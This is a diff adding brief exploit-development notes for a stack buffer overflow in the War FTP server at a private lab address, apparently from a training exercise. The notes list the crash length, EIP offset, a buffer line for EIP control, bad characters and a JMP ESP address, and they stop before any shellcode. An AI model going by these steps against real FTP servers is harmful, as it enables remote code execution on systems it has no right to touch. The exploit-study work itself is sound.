@@ -1,0 +1,20 @@
+App : War FTP
+
+IP 192.168.0.134
+Port:21
+
+________________________________________________
+1. Send Fuzzin and crash remote application at 1100
+
+2. Send Paylaod and find EIP => 32714131
+
+3. FInd Offset 485
+
+4. Send EIP control paylaod buffer = "A" * 485 + "B" * 4 + "D" * (1100-len(buffer))
+
+5. Find Bad Char = > \x00, \X0A, and \ x0d
+
+6. JMP ESP => !mona  modules 
+7C9D30D7 
+
+7. Sending final payload
